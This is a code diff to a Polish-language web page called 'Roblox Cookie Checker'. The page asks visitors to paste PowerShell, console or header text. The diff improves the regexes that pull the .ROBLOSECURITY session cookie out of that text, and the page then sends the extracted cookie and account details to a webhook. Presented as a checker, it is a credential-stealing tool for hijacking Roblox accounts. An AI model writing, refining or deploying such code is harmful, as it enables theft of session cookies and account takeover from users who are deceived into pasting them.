@@ -29,11 +29,11 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <div class="container">
-  <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>
-  Cookie zostanie wyciągnięte automatycznie (obsługuje formaty typu .ROBLOSECURITY w cudzysłowach, ostrzeżenia itp.)</p>
+  <h1>Roblox Cookie Checker (PowerShell & inne formaty)</h1>
+  <p>Wklej kod PowerShell / konsolę / headers / JSON itp.<br>
+  Cookie zostanie automatycznie wyciągnięte z formatu: <code>".ROBLOSECURITY", "TU_COOKIE"</code></p>
 
-  <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
+  <textarea id="input" placeholder="Wklej tutaj cały kod / tekst..."></textarea>
 
   <button onclick="check()">Sprawdź i wyślij na webhook</button>
 
@@ -53,34 +53,31 @@ async function check() {
   }
 
   // ──────────────────────────────────────────────
-  // ULEPSZONY WYCIĄGACZ COOKIE – działa na Twoim przykładzie
+  // ULEPSZONY WYCIĄGACZ – specjalnie pod Twój PowerShell
   // ──────────────────────────────────────────────
   let cookie = null;
 
-  // 1. Główny wzorzec – -and-items.|_ + wartość aż do najbliższego "
-  let match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
+  // 1. Najważniejszy – format z New-Object System.Net.Cookie(".ROBLOSECURITY", "COOKIE", ...)
+  let match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) {
     cookie = match[1].trim();
   }
 
-  // 2. Specjalny fallback dla PowerShell / .NET cookie – szuka po ".ROBLOSECURITY", " + wartość + "
+  // 2. Jeśli nie złapał – szuka po prostu długiego ciągu z ostrzeżeniem
   if (!cookie) {
-    match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
-    if (match && match[1]) {
-      cookie = match[1].trim();
-    }
+    match = raw.match(/_\\|WARNING[^"]{200,}/);
+    if (match) cookie = match[0].trim();
   }
 
-  // 3. Bardzo luźny fallback – szuka najdłuższego ciągu zaczynającego się od _|WARNING
+  // 3. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
   if (!cookie) {
-    const fallbackMatches = raw.match(/_\\|WARNING[^"]{200,}/g) || [];
+    const fallbackMatches = raw.match(/_\\|[^"]{200,}/g) || [];
     if (fallbackMatches.length > 0) {
-      // bierz najdłuższy – najczęściej to jest ten właściwy
       cookie = fallbackMatches.reduce((a, b) => a.length > b.length ? a : b).trim();
     }
   }
 
-  // Ostateczna walidacja
+  // Walidacja
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
     result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
     return;
@@ -104,7 +101,6 @@ async function check() {
       return;
     }
 
-    // Wyświetl wynik na stronie (opcjonalne)
     let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
 
     if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
